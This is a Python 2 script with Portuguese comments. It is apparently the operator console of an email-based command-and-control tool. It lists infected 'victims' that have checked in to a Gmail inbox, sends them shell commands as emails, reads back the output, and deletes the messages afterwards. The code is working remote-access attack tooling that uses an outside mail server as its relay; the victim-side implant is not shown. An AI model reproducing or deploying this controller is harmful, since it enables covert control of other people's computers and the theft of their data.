# -*- coding: utf-8 -*-
import smtplib, imaplib, email, time

login = "email@gmail.com" #1
senha = "senha do Gmail"

conexao_IMAP = imaplib.IMAP4_SSL('imap.gmail.com', 993)
conexao_IMAP.login(login, senha)

conexao_SMTP = smtplib.SMTP('smtp.gmail.com', 587)
conexao_SMTP.starttls()
conexao_SMTP.login(login, senha) #2

def listar_vitimas(): #3
    conexao_IMAP.select("inbox") #4
    vitimas = conexao_IMAP.uid("search", None, u'Subject "Vitima"')[1][0].split() #5
    if len(vitimas): #6
        for vitima in vitimas:
            conteudo_vitima = conexao_IMAP.uid("fetch", vitima, '(RFC822)' )[1][0][1] #7
            print conteudo_vitima.split("Subject: Vitima-")[1].strip() #8
        print

def ajuda(): #9
    print "(l)istar vitimas"
    print "(s)elecionar vitima"
    print "(e)nviar comando"

while True:
    ajuda() #10
    comando = raw_input("\nO que você deseja fazer? ")

    if comando == "l": #11
        listar_vitimas()

    elif comando == "s": #12
        ID = raw_input("Digite o número de identificação da vítima ")
        print

    elif comando == "e": #13
        try:
            if ID == "":
                raise NameError
        except NameError:
            print "\nSelecione a vítima primeiro\n"
            continue

        comando_shell = raw_input("shell> ")
        FROM = login
        TO = login
        SUBJECT = "Requisicao-" + ID
        CORPO = comando_shell
        message = "From: %s\nTo: %s\nSubject: %s\n\n%s" % (FROM, TO, SUBJECT, CORPO) #14
        conexao_SMTP.sendmail(FROM, TO, message) #15
        print "Aguardando resposta... (Ctrl+c para cancelar)"

        while True:
            try: #16
                conexao_IMAP.select("inbox") #17
                resp = conexao_IMAP.uid("search", None, u'Subject "Resposta-%s"' %ID)[1][0] #18
                if len(resp): #19
                    conteudo_resp = conexao_IMAP.uid("fetch", resp, '(RFC822)' )[1][0][1] #20
                    print conteudo_resp.split("Subject:")[1] #21
                    print
                    conexao_IMAP.uid("STORE", resp, "+FLAGS", "\\Deleted") #22
                    break

            except KeyboardInterrupt: #23
                print "Cancelado, provavelmente a vítima não existe mais"
                req1 = conexao_IMAP.uid("search", None, u'Subject "Requisicao-%s"' %ID)[1] #24
                req = ""
                for x in req1:
                    req += x
                try:
                    conexao_IMAP.uid("STORE", req, "+FLAGS", "\\Deleted") #25
                except Exception:
                    # Provavelmente a vítima está online e processou a requisição
                    # logo o atacante está tentando apagar um email que já foi apagado
                    print "\nErro ao apagar a mensagem de requisição"
                    print "Verifique manualmente na caixa de emails se não há respostas\n"
                else:
                    vit = conexao_IMAP.uid("search", None, u'Subject "Vitima-%s"' %ID)[1][0] #26
                    conexao_IMAP.uid("STORE", vit, "+FLAGS", "\\Deleted") #27
                    ID = ""
                break